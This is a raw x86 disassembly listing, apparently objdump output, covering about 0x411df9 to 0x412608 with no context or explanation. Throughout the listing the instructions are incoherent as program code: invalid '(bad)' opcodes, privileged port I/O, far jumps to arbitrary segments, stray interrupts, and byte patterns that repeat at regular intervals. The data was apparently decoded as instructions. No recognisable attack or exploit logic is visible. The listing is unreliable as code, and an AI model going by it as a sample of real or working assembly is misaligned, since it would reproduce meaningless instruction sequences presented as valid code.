  411df9:	add    BYTE PTR [ebx-0x34],al
  411dfc:	inc    eax
  411dfd:	add    eax,0x78434040
  411e02:	bound  eax,QWORD PTR [ecx+0x78]
  411e05:	add    eax,0x62404043
  411e0a:	out    0x36,al
  411e0c:	pusha  
  411e0d:	and    BYTE PTR fs:[edx-0x5f],ah
  411e11:	push   eax
  411e12:	fistp  WORD PTR [edx]
  411e14:	push   ebp
  411e15:	inc    esp
  411e16:	sub    DWORD PTR [ebx-0x57],edx
  411e19:	xor    al,0x83
  411e1b:	inc    ebx
  411e1c:	les    ebp,FWORD PTR [esi+eiz*2]
  411e1f:	inc    ebx
  411e20:	inc    ebp
  411e21:	inc    ecx
  411e22:	inc    eax
  411e23:	add    eax,0x43436240
  411e28:	add    eax,0x62004040
  411e2d:	inc    eax
  411e2e:	add    BYTE PTR [ecx+0x40],al
  411e31:	inc    ebx
  411e32:	test   BYTE PTR ds:0x58054041,ah
  411e38:	inc    eax
  411e39:	inc    eax
  411e3a:	bound  eax,QWORD PTR [eax+0x66]
  411e3d:	inc    ecx
  411e3e:	inc    eax
  411e3f:	add    eax,0x6e751e00
  411e44:	and    dh,BYTE PTR [eax]
  411e46:	clc    
  411e47:	int    0x3c
  411e49:	mov    ds:0xd55b40de,al
  411e4e:	rol    DWORD PTR [ebx-0x18],0x62
  411e52:	bound  ebp,QWORD PTR [eax-0x4325e540]
  411e58:	bound  edx,QWORD PTR [esi-0x45]
  411e5b:	jb     0x411ecb
  411e5d:	push   0x8
  411e5f:	imul   ecx,DWORD PTR [ecx+0x4d],0x4300001f
  411e66:	inc    eax
  411e67:	bound  eax,QWORD PTR ds:0x25404110
  411e6d:	add    ah,cl
  411e6f:	inc    ebx
  411e70:	add    eax,0x40402562
  411e75:	add    BYTE PTR [eax+0x40],al
  411e78:	inc    ecx
  411e79:	inc    ecx
  411e7a:	add    eax,0x78434025
  411e7f:	bound  eax,QWORD PTR [eax-0x7c]
  411e82:	inc    eax
  411e83:	inc    ecx
  411e84:	inc    eax
  411e85:	push   ebx
  411e86:	fs xor bh,dh
  411e89:	gs aad 0x3f
  411e8c:	and    eax,edx
  411e8e:	inc    esp
  411e8f:	maxps  xmm6,XMMWORD PTR [ecx+0x4a]
  411e93:	leave  
  411e94:	sbb    bh,BYTE PTR ds:0x63dd342c
  411e9a:	xchg   esp,eax
  411e9b:	lods   al,BYTE PTR ds:[esi]
  411e9c:	push   edx
  411e9d:	dec    esp
  411e9e:	cs test DWORD PTR gs:[eax+0x11],0xcdc041d8
  411ea7:	mov    ds,WORD PTR [edi-0x41]
  411eaa:	lods   al,BYTE PTR ds:[esi]
  411eab:	jmp    0x411f07
  411ead:	adc    eax,0x404041e0
  411eb2:	inc    ebx
  411eb3:	int3   
  411eb4:	add    BYTE PTR ds:0x56240,al
  411eba:	inc    ebx
  411ebb:	inc    eax
  411ebc:	inc    eax
  411ebd:	add    BYTE PTR [ecx+0x62],al
  411ec0:	bound  eax,QWORD PTR [eax]
  411ec2:	int3   
  411ec3:	inc    eax
  411ec4:	inc    ebx
  411ec5:	add    eax,0x43624041
  411eca:	adc    BYTE PTR [ecx+0x5],al
  411ecd:	inc    eax
  411ece:	ins    DWORD PTR es:[edi],dx
  411ecf:	fld    QWORD PTR ds:0x7b407ecb
  411ed5:	jmp    0x6056:0x15864ee8
  411edc:	or     BYTE PTR [ecx+eax*1-0x40],ah
  411ee0:	fs inc ecx
  411ee2:	xlat   BYTE PTR ds:[ebx]
  411ee3:	(bad)  
  411ee5:	stc    
  411ee6:	test   al,0x4f
  411ee8:	inc    edx
  411ee9:	ins    BYTE PTR es:[edi],dx
  411eea:	(bad)  
  411eeb:	inc    edx
  411eec:	nop    DWORD PTR [edx]
  411eef:	fmul   DWORD PTR [edi-0x40]
  411ef2:	sbb    eax,0x411dc22f
  411ef7:	in     eax,dx
  411ef8:	cld    
  411ef9:	cmp    esp,ebx
  411efb:	bound  eax,QWORD PTR [ebx+0x40]
  411efe:	adc    BYTE PTR ds:0x4158cc40,al
  411f04:	inc    ebx
  411f05:	bound  eax,QWORD PTR [ecx+0x40]
  411f08:	add    eax,0x4140
  411f0d:	and    eax,0x40400062
  411f12:	add    eax,0x84404340
  411f17:	int3   
  411f18:	js     0x411f1a
  411f1a:	inc    ecx
  411f1b:	adc    BYTE PTR [edx+0xf],ah
  411f1e:	pop    esi
  411f1f:	daa    
  411f20:	bound  eax,QWORD PTR [esi+0x42]
  411f23:	pop    edi
  411f24:	inc    esp
  411f25:	xchg   ebp,eax
  411f26:	inc    eax
  411f27:	add    ebp,eax
  411f29:	adc    al,0x43
  411f2b:	mov    eax,0xc0344e62
  411f30:	dec    edx
  411f31:	int    0xbd
  411f33:	imul   eax,DWORD PTR [edi+eax*8+0x2],0x0
  411f38:	inc    eax
  411f39:	inc    ecx
  411f3a:	inc    eax
  411f3b:	inc    ebx
  411f3c:	bound  ax,DWORD PTR ds:0x40434100
  411f43:	add    eax,0x40054062
  411f48:	bound  eax,QWORD PTR [ecx+0x40]
  411f4b:	inc    ebx
  411f4c:	inc    eax
  411f4d:	add    eax,0x25405841
  411f52:	bound  eax,QWORD PTR [eax+0x43]
  411f55:	inc    eax
  411f56:	adc    BYTE PTR [edx],dh
  411f58:	in     eax,dx
  411f59:	inc    esp
  411f5a:	imul   edi,DWORD PTR [edx],0x42
  411f5d:	jnp    0x411f9f
  411f5f:	inc    ecx
  411f60:	inc    esp
  411f61:	inc    ecx
  411f62:	or     al,0x3c
  411f64:	cmp    DWORD PTR [edi-0x6b],eax
  411f67:	shr    BYTE PTR [esp+esi*8],0x34
  411f6b:	arpl   WORD PTR [edi+0x6e],si
  411f6e:	xor    eax,0x802e2a2c
  411f73:	or     eax,0x2a667b8c
  411f78:	push   esi
  411f79:	test   al,0xc5
  411f7b:	retf   
  411f7c:	adc    BYTE PTR [edx+0x118d5c40],ch
  411f82:	inc    edx
  411f83:	dec    esp
  411f84:	fidiv  WORD PTR [edx]
  411f86:	xor    al,0x40
  411f88:	inc    ecx
  411f89:	inc    ebx
  411f8a:	inc    eax
  411f8b:	add    eax,0x43406262
  411f90:	inc    ecx
  411f91:	adc    BYTE PTR [eax],al
  411f93:	inc    eax
  411f94:	add    eax,0x43000562
  411f99:	add    BYTE PTR [ecx+0x40],al
  411f9c:	inc    eax
  411f9d:	add    eax,0x400062
  411fa2:	inc    ebx
  411fa3:	inc    eax
  411fa4:	js     0x411fe7
  411fa6:	inc    ecx
  411fa7:	bound  eax,QWORD PTR [eax-0x40]
  411faa:	inc    esp
  411fab:	int3   
  411fac:	test   DWORD PTR ds:0x234e8b63,0x414f9b2c
  411fb6:	inc    eax
  411fb7:	jb     0x411ff9
  411fb9:	inc    ecx
  411fba:	sub    BYTE PTR [edx+0x48],ah
  411fbd:	gs xchg edx,eax
  411fbf:	push   es
  411fc0:	rcl    BYTE PTR cs:0x21ec45cb,0x62
  411fc8:	inc    eax
  411fc9:	add    eax,0x40430041
  411fce:	inc    eax
  411fcf:	inc    ecx
  411fd0:	inc    eax
  411fd1:	inc    eax
  411fd2:	bound  eax,QWORD PTR ds:0x5624300
  411fd8:	add    BYTE PTR [eax+0x40],al
  411fdb:	add    BYTE PTR [ecx+0x43],al
  411fde:	add    BYTE PTR [eax+0x41],al
  411fe1:	add    eax,0x40436200
  411fe6:	inc    eax
  411fe7:	add    eax,0x3b40a862
  411fec:	mov    DWORD PTR [ecx+ebp*8+0x62],eax
  411ff0:	add    eax,0x4478295a
  411ff5:	inc    ebx
  411ff6:	cwde   
  411ff7:	dec    esp
  411ff8:	xchg   DWORD PTR [ecx+0x222cc04e],ebp
  411ffe:	push   edx
  411fff:	addr16 inc edi
  412001:	call   0xf9674146
  412006:	leave  
  412007:	fld    DWORD PTR [ebx-0x5a]
  41200a:	adc    DWORD PTR [eax-0x3b],ecx
  41200d:	cmp    al,0x42
  41200f:	bound  esp,QWORD PTR [ebx]
  412011:	cmp    esi,DWORD PTR [ebx]
  412013:	enter  0xa857,0x43
  412017:	add    BYTE PTR [ebp+eax*4-0x2e],cl
  41201b:	cmp    esi,edi
  41201d:	adc    BYTE PTR [esi+0x40413c40],bh
  412023:	add    eax,0x41624340
  412028:	test   BYTE PTR [eax],al
  41202a:	and    eax,0x404043
  41202f:	add    BYTE PTR ds:0x626210,al
  412035:	add    eax,0x43404140
  41203a:	inc    eax
  41203b:	inc    ecx
  41203c:	add    eax,0x10664062
  412041:	inc    ebx
  412042:	bound  ebx,QWORD PTR [esi+0x41]
  412045:	jmp    0x1a6d:0x40714844
  41204c:	bound  eax,QWORD PTR [edi+0x2c]
  41204f:	inc    edx
  412050:	xchg   edx,eax
  412051:	inc    ebx
  412052:	arpl   WORD PTR [ebx+0x6224c042],cx
  412058:	lds    edi,FWORD PTR [eax+0x332962a8]
  41205e:	pop    edx
  41205f:	int3   
  412060:	push   ecx
  412061:	cmp    eax,0xcc050710
  412066:	inc    ecx
  412067:	inc    eax
  412068:	add    BYTE PTR [eax],al
  41206a:	add    BYTE PTR [eax+0x40],al
  41206d:	inc    ebx
  41206e:	bound  eax,QWORD PTR [eax]
  412070:	inc    eax
  412071:	inc    eax
  412072:	add    eax,0x62434162
  412077:	inc    eax
  412078:	js     0x41208a
  41207a:	inc    ecx
  41207b:	add    eax,0x5404325
  412080:	bound  eax,QWORD PTR [eax+0x40]
  412083:	inc    ecx
  412084:	inc    ebx
  412085:	bound  ebx,QWORD PTR [edx-0x63]
  412088:	retf   
  412089:	test   ecx,0xc3407f4c
  41208f:	inc    esp
  412090:	dec    edx
  412091:	inc    ecx
  412092:	dec    ecx
  412093:	add    eax,0x2c5136e2
  412098:	or     DWORD PTR [ebx+0x34],eax
  41209b:	retf   
  41209c:	ror    DWORD PTR [edx+ecx*8+0x22],1
  4120a0:	addr16 mov esp,0x406a4446
  4120a6:	outs   dx,DWORD PTR ds:[esi]
  4120a7:	push   ecx
  4120a8:	dec    eax
  4120a9:	imul   ecx,DWORD PTR [ebx],0x5023a265
  4120af:	popf   
  4120b0:	inc    edi
  4120b1:	test   DWORD PTR [esp+ecx*8+0x6],0x2144c02a
  4120b9:	pop    edx
  4120ba:	and    eax,0x436241
  4120bf:	adc    BYTE PTR [eax+0x0],al
  4120c2:	add    eax,0x62410040
  4120c7:	inc    eax
  4120c8:	add    BYTE PTR [ebx-0x34],al
  4120cb:	inc    eax
  4120cc:	add    eax,0x78434040
  4120d1:	bound  eax,QWORD PTR [ecx+0x78]
  4120d4:	add    eax,0x62404043
  4120d9:	arpl   WORD PTR [edx+0x3a],sp
  4120dc:	inc    eax
  4120dd:	sub    al,0x2c
  4120df:	jmp    0xa14579b5
  4120e4:	and    eax,0xf735204a
  4120e9:	xor    al,0x30
  4120eb:	inc    ecx
  4120ec:	dec    esp
  4120ed:	ror    BYTE PTR [eax-0x58],0x43
  4120f1:	inc    esp
  4120f2:	inc    ecx
  4120f3:	inc    eax
  4120f4:	add    eax,0x43436240
  4120f9:	add    eax,0x62004040
  4120fe:	inc    eax
  4120ff:	add    BYTE PTR [ecx+0x40],al
  412102:	inc    ebx
  412103:	test   BYTE PTR ds:0x58054041,ah
  412109:	inc    eax
  41210a:	inc    eax
  41210b:	bound  eax,QWORD PTR [eax+0x66]
  41210e:	inc    ecx
  41210f:	inc    eax
  412110:	add    eax,0x40b26200
  412115:	cmc    
  412116:	popf   
  412117:	inc    ebx
  412118:	mov    ebp,0x60282810
  41211d:	and    DWORD PTR [edx+ebp*1+0x67],eax
  412121:	inc    ebx
  412122:	ins    BYTE PTR es:[edi],dx
  412123:	xchg   esi,eax
  412124:	cld    
  412125:	inc    eax
  412126:	sub    al,0x43
  412128:	mov    al,ds:0x4031343e
  41212d:	pop    ss
  41212e:	push   ds
  41212f:	sub    al,al
  412131:	adc    eax,0x6357780
  412136:	aad    0x44
  412138:	bound  ebp,QWORD PTR [eax-0x3fbf943b]
  41213e:	add    BYTE PTR [eax],al
  412140:	inc    ebx
  412141:	inc    eax
  412142:	bound  eax,QWORD PTR ds:0x25404110
  412148:	add    ah,cl
  41214a:	inc    ebx
  41214b:	add    eax,0x40402562
  412150:	add    BYTE PTR [eax+0x40],al
  412153:	inc    ecx
  412154:	inc    ecx
  412155:	add    eax,0x78434025
  41215a:	bound  eax,QWORD PTR [eax-0x7c]
  41215d:	inc    eax
  41215e:	inc    ecx
  41215f:	inc    ebp
  412160:	or     DWORD PTR [edx+ebx*2],edx
  412163:	dec    esp
  412164:	aas    
  412165:	das    
  412166:	xor    al,0xfe
  412168:	int3   
  412169:	je     0x41219d
  41216b:	test   BYTE PTR [edx+0x68],bl
  41216e:	das    
  41216f:	dec    eax
  412170:	bound  esp,QWORD PTR [edx+0x11]
  412173:	ret    
  412174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412175:	inc    eax
  412176:	sar    BYTE PTR [ecx+ebp*4],0x42
  41217a:	lods   al,BYTE PTR ds:[esi]
  41217b:	inc    ebp
  41217c:	xchg   edx,eax
  41217d:	adc    BYTE PTR [ecx],bh
  41217f:	sbb    al,0xb8
  412181:	inc    ebx
  412182:	or     DWORD PTR [edx],esi
  412184:	add    BYTE PTR [ecx+eax*2+0x40],al
  412188:	inc    eax
  412189:	inc    ebx
  41218a:	int3   
  41218b:	add    BYTE PTR ds:0x56240,al
  412191:	inc    ebx
  412192:	inc    eax
  412193:	inc    eax
  412194:	add    BYTE PTR [ecx+0x62],al
  412197:	bound  eax,QWORD PTR [eax]
  412199:	int3   
  41219a:	inc    eax
  41219b:	inc    ebx
  41219c:	add    eax,0x43624041
  4121a1:	adc    BYTE PTR [ecx+0x5],al
  4121a4:	inc    eax
  4121a5:	inc    eax
  4121a6:	int    0x5
  4121a8:	mov    ebp,0x46a6346a
  4121ad:	push   esp
  4121ae:	and    bl,cl
  4121b0:	ins    BYTE PTR es:[edi],dx
  4121b1:	bound  ebx,QWORD PTR fs:[ebx+0x60]
  4121b5:	xor    bh,dh
  4121b7:	dec    eax
  4121b8:	loope  0x41221d
  4121ba:	sbb    eax,0x445840a5
  4121bf:	inc    edx
  4121c0:	and    BYTE PTR [eax+0x4362f18c],dh
  4121c6:	inc    eax
  4121c7:	adc    BYTE PTR ds:0x4158cc40,al
  4121cd:	inc    ebx
  4121ce:	bound  eax,QWORD PTR [ecx+0x40]
  4121d1:	add    eax,0x4140
  4121d6:	and    eax,0x40400062
  4121db:	add    eax,0x84404340
  4121e0:	int3   
  4121e1:	js     0x4121e3
  4121e3:	inc    ecx
  4121e4:	adc    BYTE PTR [edx+0xf],ah
  4121e7:	dec    edx
  4121e8:	shr    BYTE PTR [edx+edx*8],0xf7
  4121ec:	arpl   WORD PTR gs:[ebx+0x40],dx
  4121f0:	jle    0x41220c
  4121f2:	sbb    BYTE PTR [edi-0x6e],0x18
  4121f6:	jecxz  0x412245
  4121f8:	jns    0x4121bf
  4121fa:	fs popf 
  4121fc:	mov    edi,0x40601de4
  412201:	push   edi
  412202:	imul   eax,DWORD PTR [edx+0x6b],0x2c408662
  412209:	(bad)  
  41220a:	sub    BYTE PTR [ebx-0x62],al
  41220d:	inc    eax
  41220e:	inc    ebp
  41220f:	jle    0x412224
  412211:	inc    esp
  412212:	ret    
  412213:	mov    ebp,0x404a2a52
  412218:	inc    ecx
  412219:	sub    al,0x0
  41221b:	inc    eax
  41221c:	inc    ecx
  41221d:	inc    eax
  41221e:	inc    ebx
  41221f:	bound  ax,DWORD PTR ds:0x40434100
  412226:	add    eax,0x40054062
  41222b:	bound  eax,QWORD PTR [ecx+0x40]
  41222e:	inc    ebx
  41222f:	inc    eax
  412230:	add    eax,0x25405841
  412235:	bound  eax,QWORD PTR [eax+0x43]
  412238:	inc    eax
  412239:	adc    BYTE PTR ds:0x5d5ad048,ch
  41223f:	bound  ecx,QWORD PTR [ebp+0x18]
  412242:	mov    ebp,0xad864860
  412247:	inc    eax
  412248:	inc    eax
  412249:	jp     0x412297
  41224b:	inc    ecx
  41224c:	sub    eax,0x7c7b0b0c
  412251:	test   eax,0xab35245f
  412256:	pop    ecx
  412257:	inc    eax
  412258:	push   ss
  412259:	sbb    al,0xdd
  41225b:	push   ecx
  41225c:	imul   edi,DWORD PTR [eax-0x4b6cc721],0x51
  412263:	lods   al,BYTE PTR ds:[esi]
  412264:	xchg   ecx,eax
  412265:	add    eax,0x40424086
  41226a:	inc    ecx
  41226b:	inc    ebx
  41226c:	inc    eax
  41226d:	add    eax,0x43406262
  412272:	inc    ecx
  412273:	adc    BYTE PTR [eax],al
  412275:	inc    eax
  412276:	add    eax,0x43000562
  41227b:	add    BYTE PTR [ecx+0x40],al
  41227e:	inc    eax
  41227f:	add    eax,0x400062
  412284:	inc    ebx
  412285:	inc    eax
  412286:	js     0x4122c9
  412288:	inc    ecx
  412289:	bound  eax,QWORD PTR [eax+0x62]
  41228c:	shr    BYTE PTR [eax+0x62],0xcb
  412290:	inc    DWORD PTR [eax+0x7e]
  412293:	arpl   WORD PTR [eax+0x2],bp
  412296:	int    0x45
  412298:	or     esi,DWORD PTR [eax]
  41229a:	neg    DWORD PTR [ebx+ecx*8+0x43ca84]
  4122a1:	inc    eax
  4122a2:	inc    eax
  4122a3:	inc    esp
  4122a4:	push   edi
  4122a5:	inc    ebx
  4122a6:	cmp    eax,0x2d73d143
  4122ab:	sub    al,0x62
  4122ad:	inc    eax
  4122ae:	add    eax,0x40430041
  4122b3:	inc    eax
  4122b4:	inc    ecx
  4122b5:	inc    eax
  4122b6:	inc    eax
  4122b7:	bound  eax,QWORD PTR ds:0x5624300
  4122bd:	add    BYTE PTR [eax+0x40],al
  4122c0:	add    BYTE PTR [ecx+0x43],al
  4122c3:	add    BYTE PTR [eax+0x41],al
  4122c6:	add    eax,0x40436200
  4122cb:	inc    eax
  4122cc:	add    eax,0x1cafd962
  4122d1:	cld    
  4122d2:	sub    eax,DWORD PTR [eax+0x40]
  4122d5:	adc    al,0x34
  4122d7:	xor    eax,0x7a4669bc
  4122dc:	xor    al,0xc5
  4122de:	pop    esi
  4122df:	bound  eax,QWORD PTR [ebp-0x14bf58a6]
  4122e5:	inc    ecx
  4122e6:	test   al,0xa1
  4122e8:	(bad)  
  4122e9:	ror    BYTE PTR [edx+0x52ee4028],1
  4122ef:	in     al,dx
  4122f0:	inc    ebp
  4122f1:	add    eax,0x447c40aa
  4122f6:	daa    
  4122f7:	bound  eax,QWORD PTR [edi-0x79]
  4122fa:	in     al,0x40
  4122fc:	loop   0x41233f
  4122fe:	inc    eax
  4122ff:	add    eax,0x41624340
  412304:	test   BYTE PTR [eax],al
  412306:	and    eax,0x404043
  41230b:	add    BYTE PTR ds:0x626210,al
  412311:	add    eax,0x43404140
  412316:	inc    eax
  412317:	inc    ecx
  412318:	add    eax,0x10664062
  41231d:	inc    ebx
  41231e:	bound  ebp,QWORD PTR [ebx+eiz*8]
  412321:	mov    eax,0x34e1487d
  412326:	mov    esi,0x6941ab12
  41232b:	pop    ebp
  41232c:	inc    esi
  41232d:	inc    eax
  41232e:	mov    edi,0x131942d5
  412333:	(bad)  
  412335:	and    al,0x40
  412337:	pop    ecx
  412338:	inc    ecx
  412339:	push   edx
  41233a:	ror    BYTE PTR [edi+ebx*4-0x1c11bfc0],0x48
  412342:	bound  ecx,QWORD PTR [edi+ebp*1+0x4041cc05]
  412349:	add    BYTE PTR [eax],al
  41234b:	add    BYTE PTR [eax+0x40],al
  41234e:	inc    ebx
  41234f:	bound  eax,QWORD PTR [eax]
  412351:	inc    eax
  412352:	inc    eax
  412353:	add    eax,0x62434162
  412358:	inc    eax
  412359:	js     0x41236b
  41235b:	inc    ecx
  41235c:	add    eax,0x5404325
  412361:	bound  eax,QWORD PTR [eax+0x40]
  412364:	inc    ecx
  412365:	inc    ebx
  412366:	sub    DWORD PTR [ebp+0x44],ebx
  412369:	jns    0x4123ac
  41236b:	or     eax,0xb440d812
  412370:	sub    al,0x38
  412372:	sbb    DWORD PTR [eax-0xa],ebx
  412375:	ja     0x4123ae
  412377:	jno    0x412389
  412379:	bound  edx,QWORD PTR [ebx+0x62]
  41237c:	gs dec eax
  41237e:	inc    eax
  41237f:	nop
  412380:	int    0x25
  412382:	inc    ecx
  412383:	bound  eax,QWORD PTR [ebx+0x0]
  412386:	adc    BYTE PTR [eax+0x0],al
  412389:	add    eax,0x62410040
  41238e:	inc    eax
  41238f:	add    BYTE PTR [ebx-0x34],al
  412392:	inc    eax
  412393:	add    eax,0x78434040
  412398:	bound  eax,QWORD PTR [ecx+0x78]
  41239b:	add    eax,0x62404043
  4123a0:	das    
  4123a1:	jecxz  0x412366
  4123a3:	mov    ah,0x7c
  4123a5:	inc    eax
  4123a6:	inc    eax
  4123a7:	xchg   DWORD PTR [ebx+ebp*4-0x4],ecx
  4123ab:	inc    ecx
  4123ac:	(bad)  
  4123ae:	and    al,0xe2
  4123b0:	arpl   WORD PTR [edx+0x27],ax
  4123b3:	lods   eax,DWORD PTR ds:[esi]
  4123b4:	cmovo  ecx,edx
  4123b7:	inc    esp
  4123b8:	popa   
  4123b9:	stos   DWORD PTR es:[edi],eax
  4123ba:	cmp    BYTE PTR [ebp-0x6d],dl
  4123bd:	xor    al,BYTE PTR [eax+0x2c]
  4123c0:	dec    eax
  4123c1:	dec    eax
  4123c2:	outs   dx,DWORD PTR ds:[esi]
  4123c3:	fdiv   QWORD PTR [edi]
  4123c5:	inc    eax
  4123c6:	gs push cs
  4123c8:	bound  eax,QWORD PTR [edx+0x8]
  4123cb:	inc    ebx
  4123cc:	cld    
  4123cd:	inc    ecx
  4123ce:	inc    eax
  4123cf:	add    eax,0x43436240
  4123d4:	add    eax,0x62004040
  4123d9:	inc    eax
  4123da:	add    BYTE PTR [ecx+0x40],al
  4123dd:	inc    ebx
  4123de:	test   BYTE PTR ds:0x58054041,ah
  4123e4:	inc    eax
  4123e5:	inc    eax
  4123e6:	bound  eax,QWORD PTR [eax+0x66]
  4123e9:	inc    ecx
  4123ea:	inc    eax
  4123eb:	add    eax,0xc5852500
  4123f0:	push   eax
  4123f1:	es cwde 
  4123f3:	in     al,0xf0
  4123f5:	inc    eax
  4123f6:	inc    eax
  4123f7:	and    BYTE PTR [eax+ebx*8+0x63],cl
  4123fb:	js     0x4123f2
  4123fd:	and    al,0x4
  4123ff:	(bad)  
  412400:	jnp    0x412465
  412402:	or     BYTE PTR [ebx],cl
  412404:	jo     0x412446
  412406:	inc    eax
  412407:	inc    esp
  412408:	add    BYTE PTR [eax],al
  41240a:	inc    ebx
  41240b:	inc    eax
  41240c:	bound  eax,QWORD PTR ds:0x25404110
  412412:	add    ah,cl
  412414:	inc    ebx
  412415:	add    eax,0x40402562
  41241a:	add    BYTE PTR [eax+0x40],al
  41241d:	inc    ecx
  41241e:	inc    ecx
  41241f:	add    eax,0x78434025
  412424:	bound  eax,QWORD PTR [eax-0x7c]
  412427:	inc    eax
  412428:	inc    ecx
  412429:	dec    ecx
  41242a:	jmp    0x2c0f:0xf55ca842
  412431:	inc    ecx
  412432:	sub    BYTE PTR ds:0x48298f12,bh
  412438:	or     al,0x40
  41243a:	push   esp
  41243b:	stc    
  41243c:	inc    ecx
  41243d:	cmp    bh,BYTE PTR [ebx+0x48d4d5cd]
  412443:	or     BYTE PTR [esp+ecx*4-0xb],al
  412447:	inc    eax
  412448:	dec    ebx
  412449:	push   ebp
  41244a:	adc    eax,0x75383099
  41244f:	gs (bad) 
  412451:	loope  0x41241e
  412453:	gs stos DWORD PTR es:[edi],eax
  412455:	inc    ecx
  412456:	inc    eax
  412457:	inc    eax
  412458:	inc    ebx
  412459:	int3   
  41245a:	add    BYTE PTR ds:0x56240,al
  412460:	inc    ebx
  412461:	inc    eax
  412462:	inc    eax
  412463:	add    BYTE PTR [ecx+0x62],al
  412466:	bound  eax,QWORD PTR [eax]
  412468:	int3   
  412469:	inc    eax
  41246a:	inc    ebx
  41246b:	add    eax,0x43624041
  412470:	adc    BYTE PTR [ecx+0x5],al
  412473:	inc    eax
  412474:	inc    edx
  412475:	mov    ecx,0x51354451
  41247a:	push   ss
  41247b:	pop    edx
  41247c:	je     0x4124f3
  41247e:	inc    eax
  41247f:	sub    al,0xd0
  412481:	inc    ecx
  412482:	adc    cl,BYTE PTR [ebp+0xa7abf8b]
  412488:	dec    ebp
  412489:	ror    BYTE PTR [eax],cl
  41248b:	inc    ecx
  41248c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41248d:	mov    ecx,0xb443cd40
  412492:	call   0x3b50:0x69f13dc9
  412499:	dec    edx
  41249a:	bound  edx,QWORD PTR [eax+0x7e]
  41249d:	inc    eax
  41249e:	xor    esp,DWORD PTR [edx+0x43]
  4124a1:	inc    eax
  4124a2:	adc    BYTE PTR ds:0x4158cc40,al
  4124a8:	inc    ebx
  4124a9:	bound  eax,QWORD PTR [ecx+0x40]
  4124ac:	add    eax,0x4140
  4124b1:	and    eax,0x40400062
  4124b6:	add    eax,0x84404340
  4124bb:	int3   
  4124bc:	js     0x4124be
  4124be:	inc    ecx
  4124bf:	adc    BYTE PTR [edx+0xf],ah
  4124c2:	out    dx,al
  4124c3:	das    
  4124c4:	aam    0x9c
  4124c6:	or     eax,0x44425476
  4124cb:	bound  eax,QWORD PTR [edx+0x70c4cb0b]
  4124d1:	cs sub al,0x2
  4124d4:	jnp    0x412493
  4124d6:	inc    esp
  4124d7:	out    dx,eax
  4124d8:	inc    eax
  4124d9:	loop   0x4124e3
  4124db:	dec    ecx
  4124dc:	push   ecx
  4124dd:	arpl   WORD PTR [ebx-0x3],ax
  4124e0:	push   eax
  4124e1:	inc    ecx
  4124e2:	lds    esp,FWORD PTR [ecx]
  4124e4:	inc    BYTE PTR [ecx+0x49]
  4124e7:	stos   DWORD PTR es:[edi],eax
  4124e8:	cmp    eax,0x655d40
  4124ed:	inc    eax
  4124ee:	inc    ecx
  4124ef:	inc    eax
  4124f0:	inc    ebx
  4124f1:	bound  ax,DWORD PTR ds:0x40434100
  4124f8:	add    eax,0x40054062
  4124fd:	bound  eax,QWORD PTR [ecx+0x40]
  412500:	inc    ebx
  412501:	inc    eax
  412502:	add    eax,0x25405841
  412507:	bound  eax,QWORD PTR [eax+0x43]
  41250a:	inc    eax
  41250b:	adc    BYTE PTR [edi+0x30],cl
  41250e:	and    BYTE PTR [ebx+0x34fe2678],dh
  412514:	inc    edx
  412515:	or     edi,DWORD PTR [esi]
  412517:	call   0x6089f0d2
  41251c:	xchg   edx,eax
  41251d:	mov    esp,0x40bbcd55
  412522:	cmp    al,0xa1
  412524:	dec    esp
  412525:	inc    eax
  412526:	inc    ecx
  412527:	inc    ebx
  412528:	inc    eax
  412529:	add    eax,0x43406262
  41252e:	inc    ecx
  41252f:	adc    BYTE PTR [eax],al
  412531:	inc    eax
  412532:	add    eax,0x43000562
  412537:	add    BYTE PTR [ecx+0x40],al
  41253a:	inc    eax
  41253b:	add    eax,0x400062
  412540:	inc    ebx
  412541:	inc    eax
  412542:	js     0x412585
  412544:	inc    ecx
  412545:	bound  eax,QWORD PTR [eax+0x62]
  412548:	or     eax,0x660743d
  41254d:	ret    
  41254e:	push   edx
  41254f:	pop    ss
  412550:	xchg   edx,eax
  412551:	inc    ebx
  412552:	pop    ebx
  412553:	push   ecx
  412554:	aad    0x50
  412556:	(bad)  
  412557:	in     al,0x63
  412559:	ja     0x4124dd
  41255b:	inc    eax
  41255c:	dec    ebx
  41255d:	or     eax,0x40626300
  412562:	add    eax,0x40430041
  412567:	inc    eax
  412568:	inc    ecx
  412569:	inc    eax
  41256a:	inc    eax
  41256b:	bound  eax,QWORD PTR ds:0x5624300
  412571:	add    BYTE PTR [eax+0x40],al
  412574:	add    BYTE PTR [ecx+0x43],al
  412577:	add    BYTE PTR [eax+0x41],al
  41257a:	add    eax,0x40436200
  41257f:	inc    eax
  412580:	add    eax,0x71e15162
  412585:	sub    edi,esi
  412587:	retf   
  412588:	test   ebx,ecx
  41258a:	xor    al,0x64
  41258c:	inc    edx
  41258d:	dec    ebx
  41258e:	inc    esp
  41258f:	jbe    0x4125f3
  412591:	mov    edi,0x40f0b540
  412596:	sub    al,0x35
  412598:	push   edx
  412599:	mov    edi,0x327a5950
  41259e:	add    al,0x47
  4125a0:	dec    esi
  4125a1:	jmp    0x4125e0
  4125a3:	add    DWORD PTR [edi-0x1ebe3216],ebx
  4125a9:	inc    ecx
  4125aa:	inc    eax
  4125ab:	add    eax,0x41624340
  4125b0:	test   BYTE PTR [eax],al
  4125b2:	and    eax,0x404043
  4125b7:	add    BYTE PTR ds:0x626210,al
  4125bd:	add    eax,0x43404140
  4125c2:	inc    eax
  4125c3:	inc    ecx
  4125c4:	add    eax,0x10664062
  4125c9:	inc    ebx
  4125ca:	bound  ebx,QWORD PTR [esi+0x6536e7c3]
  4125d0:	js     0x41260e
  4125d2:	dec    edi
  4125d3:	inc    edx
  4125d4:	push   ecx
  4125d5:	cmp    ah,BYTE PTR [ebx+0x44]
  4125d8:	cli    
  4125d9:	aad    0x4c
  4125db:	inc    edi
  4125dc:	leave  
  4125dd:	ficom  WORD PTR [edx]
  4125df:	imul   eax,DWORD PTR [esp+eax*2+0x69],0x3db0bcdc
  4125e7:	outs   dx,DWORD PTR ds:[esi]
  4125e8:	sub    al,0x7b
  4125ea:	dec    edx
  4125eb:	and    dl,BYTE PTR ds:0x2517cb0
  4125f1:	lods   al,BYTE PTR ds:[esi]
  4125f2:	xor    al,0xf4
  4125f4:	retf   
  4125f5:	add    eax,0x4041cc
  4125fa:	add    BYTE PTR [eax],al
  4125fc:	inc    eax
  4125fd:	inc    eax
  4125fe:	inc    ebx
  4125ff:	bound  eax,QWORD PTR [eax]
  412601:	inc    eax
  412602:	inc    eax
  412603:	add    eax,0x62434162
  412608:	inc    eax
